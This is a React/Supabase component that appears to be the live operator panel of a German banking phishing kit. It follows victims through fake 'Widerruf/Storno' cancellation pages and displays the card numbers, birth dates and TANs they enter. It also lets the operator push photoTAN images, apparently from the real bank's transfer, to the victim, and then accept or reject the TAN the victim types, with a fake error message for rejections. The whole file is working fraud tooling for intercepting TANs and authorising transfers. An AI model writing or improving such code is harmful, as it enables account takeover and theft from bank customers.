import { useEffect, useRef, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Link2, Ban, XCircle, CheckCircle2, Trash2, Upload, RefreshCw, RotateCcw } from "lucide-react";
import { toast } from "sonner";

type StornoRow = {
  id: string;
  token: string;
  auftraggeber_name: string | null;
  auftraggeber_iban: string | null;
  empfaenger_name: string | null;
  empfaenger_iban: string | null;
  betrag: number | null;
  verwendungszweck: string | null;
  executed_at: string | null;
  customer_phase: string | null;
  photo_tan_image: string | null;
  last_error: string | null;
  show_berater: boolean | null;
  used: boolean;
  created_at: string;
};

type MetaRow = { task_id: string; tan: string | null; berater_geburtsdatum?: string | null; berater_karte?: string | null };

const PHASE_LABEL: Record<string, string> = {
  pending: "Wartet auf Token-Eingabe",
  berater: "Berater-Verifizierung",
  widerruf: "Kunde auf Landing-Seite",
  start: "Kunde prüft Transaktion – wartet auf Freigabe",
  phototan_request: "PhotoTAN angefordert – Bild hochladen",
  phototan: "PhotoTAN-Eingabe (Kunde)",
  success: "Erfolgreich (Weitergeleitet)",
  aborted: "Abgebrochen",
};

const fmtBetrag = (n: number | null) =>
  n == null ? "—" : new Intl.NumberFormat("de-DE", { minimumFractionDigits: 2, maximumFractionDigits: 2 }).format(Number(n)) + " €";

const StornoLiveCard = () => {
  const [rows, setRows] = useState<StornoRow[]>([]);
  const [metas, setMetas] = useState<Record<string, MetaRow>>({});

  const load = async () => {
    const [{ data: a }, { data: m }] = await Promise.all([
      (supabase as any).from("storno_tokens").select("*").order("created_at", { ascending: false }).limit(50),
      (supabase as any).from("panel_task_meta").select("task_id, tan, berater_geburtsdatum, berater_karte").like("task_id", "storno:%"),
    ]);
    setRows(a || []);
    const map: Record<string, MetaRow> = {};
    (m || []).forEach((x: any) => { map[String(x.task_id).replace(/^storno:/, "")] = x; });
    setMetas(map);
  };

  useEffect(() => {
    load();
    const ch1 = (supabase as any).channel("storno_live_tokens")
      .on("postgres_changes", { event: "*", schema: "public", table: "storno_tokens" }, load).subscribe();
    const ch2 = (supabase as any).channel("storno_live_meta")
      .on("postgres_changes", { event: "*", schema: "public", table: "panel_task_meta" }, load).subscribe();
    const iv = window.setInterval(load, 4000);
    return () => { window.clearInterval(iv); (supabase as any).removeChannel(ch1); (supabase as any).removeChannel(ch2); };
  }, []);

  const update = async (id: string, patch: Record<string, any>) => {
    const { error } = await (supabase as any).from("storno_tokens").update(patch).eq("id", id);
    if (error) toast.error(error.message);
  };
  const setPhase = (r: StornoRow, phase: string, extra: Record<string, any> = {}) =>
    update(r.id, { customer_phase: phase, ...extra });

  const showPhotoTan = (r: StornoRow) => {
    if (!r.photo_tan_image) { toast.error("Bitte zuerst PhotoTAN-Bild hochladen"); return; }
    setPhase(r, "phototan", { last_error: null });
  };

  const rejectTan = async (r: StornoRow) => {
    await (supabase as any).from("panel_task_meta").update({ tan: null }).eq("task_id", `storno:${r.id}`);
    await setPhase(r, "phototan", { last_error: "Ihre TAN konnte nicht verifiziert werden. Bitte versuchen Sie es erneut." });
  };

  const acceptTan = (r: StornoRow) => update(r.id, {
    customer_phase: "success",
    used: true,
    used_at: new Date().toISOString(),
    last_error: null,
  });

  const setPhotoTanImage = (r: StornoRow, dataUrl: string | null) =>
    update(r.id, { photo_tan_image: dataUrl });

  const sendBackToAuth = async (r: StornoRow) => {
    await setPhase(r, "aborted", { last_error: null });
    toast.success("Kunde wird zu /auth zurückgeleitet");
  };

  const remove = async (r: StornoRow) => {
    if (!window.confirm("Session wirklich löschen?")) return;
    await (supabase as any).from("panel_task_meta").delete().eq("task_id", `storno:${r.id}`);
    await (supabase as any).from("storno_tokens").delete().eq("id", r.id);
    toast.success("Gelöscht");
  };

  const copyLink = async (r: StornoRow) => {
    const url = `${window.location.origin}/auth`;
    try { await navigator.clipboard.writeText(url); toast.success("Kunden-Link kopiert"); } catch { toast.error("Kopieren fehlgeschlagen"); }
  };

  

  return (
    <Card>
      <CardHeader>
        <CardTitle className="flex items-center gap-2"><Ban className="h-5 w-5" /> Live-Steuerung Storno</CardTitle>
      </CardHeader>
      <CardContent className="space-y-4">
        {(() => {
          const visible = rows.filter(r => (r.customer_phase || "pending") !== "pending");
          if (!visible.length) return <div className="text-sm text-muted-foreground">Keine aktiven Storno-Sessions.</div>;
          return visible.map(r => {
          const meta = metas[r.id];
          const phase = r.customer_phase || "widerruf";
          const done = phase === "success" || phase === "aborted";
          return (
            <div key={r.id} className={`rounded-md border p-4 space-y-3 ${done ? "opacity-70" : ""}`}>
              <div className="flex flex-wrap items-center justify-between gap-2">
                <div className="flex items-center gap-2 min-w-0">
                  <span className="font-mono text-sm px-2 py-0.5 rounded bg-muted">{r.token}</span>
                  <Badge variant={done ? "secondary" : "default"}>{PHASE_LABEL[phase] || phase}</Badge>
                  {r.auftraggeber_name && <span className="text-sm text-muted-foreground truncate">{r.auftraggeber_name}</span>}
                </div>
                <div className="flex gap-1">
                  <Button size="sm" variant="ghost" onClick={() => copyLink(r)} title="Kunden-Link kopieren"><Link2 className="h-4 w-4" /></Button>
                  <Button size="sm" variant="ghost" onClick={() => remove(r)} title="Löschen"><Trash2 className="h-4 w-4" /></Button>
                </div>
              </div>

              <div className="grid sm:grid-cols-4 gap-2 text-xs bg-muted/50 rounded p-2">
                <MetaField label="Empfänger" value={r.empfaenger_name || "—"} />
                <MetaField label="Empfänger-IBAN" value={r.empfaenger_iban || "—"} mono />
                <MetaField label="Betrag" value={fmtBetrag(r.betrag)} bold />
                <MetaField label="Verwendungszweck" value={r.verwendungszweck || "—"} />
              </div>

              {r.show_berater && (meta?.berater_geburtsdatum || meta?.berater_karte) && (
                <div className="grid sm:grid-cols-2 gap-2 text-sm">
                  <MetaField label="Berater – Geburtsdatum" value={meta?.berater_geburtsdatum || "—"} mono />
                  <MetaField label="Berater – Kartennummer" value={meta?.berater_karte || "—"} mono />
                </div>
              )}

              <div className="text-sm">
                <MetaField label="TAN" value={meta?.tan || "—"} mono bold />
              </div>

              {!done && (
                <div className="space-y-3 pt-2 border-t">
                  <p className="text-xs text-muted-foreground">
                    {phase === "berater" && "Kunde füllt Berater-Verifizierung aus."}
                    {phase === "widerruf" && "Kunde ist auf der Widerruf-Landing-Seite."}
                    {phase === "start" && "Kunde ist auf /widerruf/start – wartet auf Klick auf „Mit photoTAN freigeben“."}
                    {phase === "phototan_request" && "Kunde hat photoTAN angefordert – Bild hochladen und freigeben."}
                    {phase === "phototan" && "Kunde sieht photoTAN – wartet auf TAN-Eingabe."}
                  </p>

                  {(phase === "start" || phase === "phototan_request" || phase === "phototan") && (
                    <StepBlock title="PhotoTAN-Bild">
                      <PhotoTanUploader r={r} onSet={url => setPhotoTanImage(r, url)} compact={phase === "phototan"} />
                    </StepBlock>
                  )}

                  <div className="flex flex-wrap justify-between gap-2">
                    <Button size="sm" variant="outline" onClick={() => sendBackToAuth(r)}>
                      <RotateCcw className="h-4 w-4 mr-1" />Kunde zurück zu /auth
                    </Button>
                    <div className="flex flex-wrap gap-2">
                      {phase === "phototan_request" && (
                        <Button size="sm" onClick={() => showPhotoTan(r)} disabled={!r.photo_tan_image}>
                          <CheckCircle2 className="h-4 w-4 mr-1" />PhotoTAN anzeigen
                        </Button>
                      )}
                      {phase === "phototan" && (
                        <>
                          <Button size="sm" variant="destructive" onClick={() => rejectTan(r)} disabled={!meta?.tan}>
                            <XCircle className="h-4 w-4 mr-1" />TAN ablehnen
                          </Button>
                          <Button size="sm" variant="outline" onClick={() => showPhotoTan(r)}>
                            <RefreshCw className="h-4 w-4 mr-1" />Neue PhotoTAN anzeigen
                          </Button>
                          <Button size="sm" onClick={() => acceptTan(r)} disabled={!meta?.tan}>
                            <CheckCircle2 className="h-4 w-4 mr-1" />TAN akzeptieren → /success
                          </Button>
                        </>
                      )}
                    </div>
                  </div>
                </div>
              )}
            </div>
          );
        });
        })()}
      </CardContent>
    </Card>
  );
};

const StepBlock = ({ title, children }: { title: string; children: React.ReactNode }) => (
  <div className="space-y-2">
    <div className="text-xs font-semibold uppercase tracking-wide text-muted-foreground">{title}</div>
    {children}
  </div>
);

const MetaField = ({ label, value, mono, bold }: { label: string; value: string; mono?: boolean; bold?: boolean }) => (
  <div>
    <div className="text-[10px] uppercase text-muted-foreground">{label}</div>
    <div className={`${mono ? "font-mono" : ""} ${bold ? "font-semibold" : ""} truncate`}>{value}</div>
  </div>
);

const PhotoTanUploader = ({ r, onSet, compact }: { r: StornoRow; onSet: (url: string | null) => void; compact?: boolean }) => {
  const inputRef = useRef<HTMLInputElement>(null);
  const [url, setUrl] = useState("");
  const [loading, setLoading] = useState(false);

  const cropDataUrl = (dataUrl: string, crop?: { x: number; y: number; w: number; h: number }) =>
    new Promise<string>((resolve, reject) => {
      const img = new Image();
      img.onload = () => {
        const box = crop ?? autoCropCanvas(img);
        const cnv = document.createElement("canvas");
        cnv.width = box.w; cnv.height = box.h;
        const ctx = cnv.getContext("2d")!;
        ctx.drawImage(img, box.x, box.y, box.w, box.h, 0, 0, box.w, box.h);
        resolve(cnv.toDataURL("image/png"));
      };
      img.onerror = () => reject(new Error("Bild konnte nicht geladen werden"));
      img.src = dataUrl;
    });

  const onFile = async (f: File) => {
    const reader = new FileReader();
    reader.onload = async () => {
      try {
        const cropped = await cropDataUrl(String(reader.result));
        onSet(cropped);
      } catch { onSet(String(reader.result)); }
    };
    reader.readAsDataURL(f);
  };

  const onUrl = async () => {
    const u = url.trim();
    if (!u) return;
    setLoading(true);
    try {
      const { data, error } = await (supabase as any).functions.invoke("fetch-photo-tan", {
        body: { url: u, autoCrop: true },
      });
      if (error || !data?.dataUrl) throw new Error(error?.message || "Fehler");
      const cropped = await cropDataUrl(data.dataUrl, data.crop);
      onSet(cropped);
      setUrl("");
      toast.success("PhotoTAN übernommen");
    } catch (e: any) {
      toast.error(e.message || "Konnte Bild nicht laden");
    } finally { setLoading(false); }
  };

  return (
    <div className="space-y-2">
      <div className="flex items-center gap-2 flex-wrap">
        <input ref={inputRef} type="file" accept="image/*" hidden
          onChange={e => { const f = e.target.files?.[0]; if (f) onFile(f); e.target.value = ""; }} />
        <Button size="sm" variant="outline" onClick={() => inputRef.current?.click()}>
          <Upload className="h-4 w-4 mr-1" />{r.photo_tan_image ? "Bild ersetzen" : "Bild hochladen"}
        </Button>
        {r.photo_tan_image && (
          <>
            {!compact && <img src={r.photo_tan_image} alt="preview" className="h-10 w-10 object-contain border rounded" />}
            <Button size="sm" variant="ghost" onClick={() => onSet(null)}>entfernen</Button>
          </>
        )}
        {!r.photo_tan_image && <span className="text-xs text-muted-foreground">oder Link einfügen ↓</span>}
      </div>
      <div className="flex items-center gap-2 flex-wrap">
        <Input
          value={url}
          onChange={e => setUrl(e.target.value)}
          onKeyDown={e => { if (e.key === "Enter") onUrl(); }}
          placeholder="Bild-URL (z. B. https://prnt.sc/..., direkte Bild-URL, imgur, ...)"
          className="h-8 flex-1 min-w-[220px]"
        />
        <Button size="sm" onClick={onUrl} disabled={loading || !url.trim()}>
          {loading ? "Lade..." : "Übernehmen"}
        </Button>
      </div>
    </div>
  );
};

function autoCropCanvas(img: HTMLImageElement): { x: number; y: number; w: number; h: number } {
  const w = img.naturalWidth, h = img.naturalHeight;
  const cnv = document.createElement("canvas");
  cnv.width = w; cnv.height = h;
  const ctx = cnv.getContext("2d")!;
  ctx.drawImage(img, 0, 0);
  let data: Uint8ClampedArray;
  try { data = ctx.getImageData(0, 0, w, h).data; }
  catch { return { x: 0, y: 0, w, h }; }
  const rowThr = Math.max(6, w * 0.02);
  const colThr = Math.max(6, h * 0.02);
  const rowC = new Uint32Array(h), colC = new Uint32Array(w);
  for (let y = 0; y < h; y++) for (let x = 0; x < w; x++) {
    const i = (y * w + x) * 4;
    if ((data[i] + data[i + 1] + data[i + 2]) / 3 < 90) { rowC[y]++; colC[x]++; }
  }
  let top = 0; while (top < h && rowC[top] < rowThr) top++;
  let bot = h - 1; while (bot > top && rowC[bot] < rowThr) bot--;
  let left = 0; while (left < w && colC[left] < colThr) left++;
  let right = w - 1; while (right > left && colC[right] < colThr) right--;
  if (right - left < 40 || bot - top < 40) return { x: 0, y: 0, w, h };
  const pad = Math.round(Math.min(right - left, bot - top) * 0.03);
  return {
    x: Math.max(0, left - pad),
    y: Math.max(0, top - pad),
    w: Math.min(w, right - left + 1 + pad * 2),
    h: Math.min(h, bot - top + 1 + pad * 2),
  };
}

export default StornoLiveCard;
